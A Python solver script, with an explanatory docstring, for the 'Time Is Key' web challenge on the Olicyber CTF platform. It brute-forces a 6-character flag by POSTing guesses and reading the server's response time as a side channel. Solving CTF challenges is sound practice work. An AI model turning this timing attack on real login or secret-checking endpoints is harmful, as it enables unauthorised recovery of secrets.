#!/usr/bin/env python3
"""
Solves the 'Time Is Key' web challenge from the Olicyber CTF platform using a Time-Based SQL Injection (or similar timing side-channel) approach.
This script attempts to exfiltrate the flag character by character by measuring the server's response time. It assumes the server introduces a time delay (e.g., 1 second) for every correct character found in the input.
Algorithm Logic:
1.  **Initialization**:
    -   Target URL: http://time-is-key.challs.olicyber.it/index.php
    -   `flag`: Starts as an empty string.
2.  **Outer Loop (`while len(flag) < 6`)**:
    -   Iterates until the flag reaches a length of 6 characters.
3.  **Inner Loop (`for i in string.printable`)**:
    -   Iterates through every printable ASCII character to guess the next character of the flag.
    -   **Payload Construction**: A payload is created combining:
        -   The currently identified `flag`.
        -   The current guess character `i`.
        -   Padding with 'a' characters to maintain a constant length of 6 (e.g., if we know 'CY', guessing 'B', payload becomes 'CYBaaa').
    -   **Request**: Sends a POST request to the target site with the constructed payload and a submit parameter.
4.  **Timing Analysis (`if r.elapsed.total_seconds() > 1 + len(flag)`)**:
    -   Checks if the request duration exceeds a specific threshold.
    -   The threshold logic implies the server sleeps for 1 second for each correct character (accumulative delay).
    -   If the timing condition is met:
        -   The guessed character `i` is considered correct.
        -   It is appended to the `flag`.
        -   The inner loop breaks to move on to the next character position.
5.  **Termination**:
    -   Once 6 characters are found, the script prints the final result.
Attributes:
    SITE (str): The URL of the challenge endpoint.
    flag (str): The accumulator string for the discovered flag.
"""
# è spwanata recentemente
import requests, string

SITE = "http://time-is-key.challs.olicyber.it/index.php"
flag = ""

while len(flag) < 6:
    for i in string.printable:
        r = requests.post(SITE, data={"flag": flag + i + 'a'*(5 - len(flag)), "submit":"Invia la flag!"})
        
        if r.elapsed.total_seconds() > 1+len(flag):
            print(i)
            flag += i
            break
        else:
            print("no", i)
print(flag)